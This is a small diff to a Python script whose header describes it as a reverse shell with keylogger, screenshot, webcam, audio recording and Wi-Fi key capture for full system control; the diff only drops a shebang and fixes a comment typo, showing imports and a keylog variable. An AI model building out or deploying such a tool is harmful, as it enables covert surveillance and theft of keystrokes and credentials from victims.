@@ -1,4 +1,3 @@
-#!/usr/bin/env python3.7
 #Moderne Reverse Shell with keylogger, screenshot, webcam, record audio, live streming.full system controll.
 
 import os
@@ -18,7 +17,7 @@ import pyscreenshot as ImageGrab
 from flask import Flask, Response 
 from pynput.keyboard import Listener, Key 
 import platform
-import subprocess #for wfikey function
+import subprocess #for wifikey function
 
 #keylog variable
 log = ""
